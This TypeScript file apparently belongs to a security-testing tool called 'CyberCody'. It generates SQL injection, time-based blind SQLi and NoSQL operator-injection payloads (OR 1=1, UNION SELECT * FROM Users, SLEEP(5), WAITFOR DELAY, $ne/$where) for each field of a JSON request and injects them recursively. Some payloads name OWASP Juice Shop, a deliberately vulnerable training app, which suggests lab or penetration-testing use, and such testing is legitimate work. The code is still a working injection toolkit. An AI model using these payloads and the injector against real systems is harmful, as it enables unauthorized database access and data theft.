// QAntum - CyberCody v25.3 Semantic Fuzzer
// AI-driven payload generator and JSON body injector

export interface ISemanticFuzzer {
  generateContextualPayloads(fieldName: string, context?: string): string[];
  injectPayloadsIntoJsonBody(body: any, context?: string): any[];
  generateBlindSQLiPayloads(fieldName: string): string[];
}

/**
 * AI-driven payload generator for SQLi/NoSQLi/BlindSQLi
 */
export class SemanticFuzzer implements ISemanticFuzzer {
  generateContextualPayloads(fieldName: string, context?: string): string[] {
    // Simulate AI logic: generate payloads based on field semantics
    const lower = fieldName.toLowerCase();
    const sqli: string[] = [];
    const nosqli: string[] = [];
    // Email field
    if (lower.includes('email')) {
      sqli.push(
        `admin@juice-sh.op'--`,
        `test@example.com' OR 1=1--`,
        `user@domain.com' OR 'x'='x`,
        `attacker@evil.com' UNION SELECT * FROM Users--`,
        `victim@site.com' AND SLEEP(5)--`
      );
      nosqli.push(
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$where": "1==1"}',
        '{"email": {"$ne": ""}}'
      );
    } else if (lower.includes('id') || lower.includes('user')) {
      sqli.push(
        `1 OR 1=1`,
        `1 UNION SELECT * FROM Users--`,
        `1 AND SLEEP(5)--`,
        `0 OR 1=1`,
        `1; WAITFOR DELAY '0:0:5'--`
      );
      nosqli.push(
        '{"$ne": 1}',
        '{"$gt": 0}',
        '{"$regex": ".*"}',
        '{"$where": "1==1"}',
        '{"id": {"$ne": 1}}'
      );
    } else if (lower.includes('basket')) {
      sqli.push(
        `1 OR SLEEP(5)--`,
        `1 UNION SELECT * FROM Baskets--`,
        `1; WAITFOR DELAY '0:0:5'--`,
        `0 OR 1=1`,
        `1 AND 1=1`
      );
      nosqli.push(
        '{"$ne": 1}',
        '{"$gt": 0}',
        '{"$regex": ".*"}',
        '{"$where": "1==1"}',
        '{"basket": {"$ne": 1}}'
      );
    } else {
      // Generic
      sqli.push(
        `test' OR 1=1--`,
        `test' UNION SELECT * FROM Users--`,
        `test' AND SLEEP(5)--`,
        `test; WAITFOR DELAY '0:0:5'--`,
        `test' OR 'x'='x`
      );
      nosqli.push(
        '{"$ne": "test"}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$where": "1==1"}',
        '{"field": {"$ne": "test"}}'
      );
    }
    return [...sqli, ...nosqli];
  }

  injectPayloadsIntoJsonBody(body: any, context?: string): any[] {
    // Recursively inject payloads into every string/number field
    const results: any[] = [];
    const keys = Object.keys(body);
    for (const key of keys) {
      const payloads = this.generateContextualPayloads(key, context);
      for (const payload of payloads) {
        const clone = JSON.parse(JSON.stringify(body));
        clone[key] = payload;
        results.push(clone);
      }
      // If value is object, recurse
      if (typeof body[key] === 'object' && body[key] !== null) {
        const nested = this.injectPayloadsIntoJsonBody(body[key], context);
        for (const n of nested) {
          const clone = JSON.parse(JSON.stringify(body));
          clone[key] = n;
          results.push(clone);
        }
      }
    }
    return results;
  }

  generateBlindSQLiPayloads(fieldName: string): string[] {
    const lower = fieldName.toLowerCase();
    return [
      `1 AND SLEEP(5)--`,
      `1; WAITFOR DELAY '0:0:5'--`,
      `test' AND SLEEP(5)--`,
      `test; WAITFOR DELAY '0:0:5'--`,
      `admin@juice-sh.op' AND SLEEP(5)--`
    ];
  }
}

export const semanticFuzzer = new SemanticFuzzer();
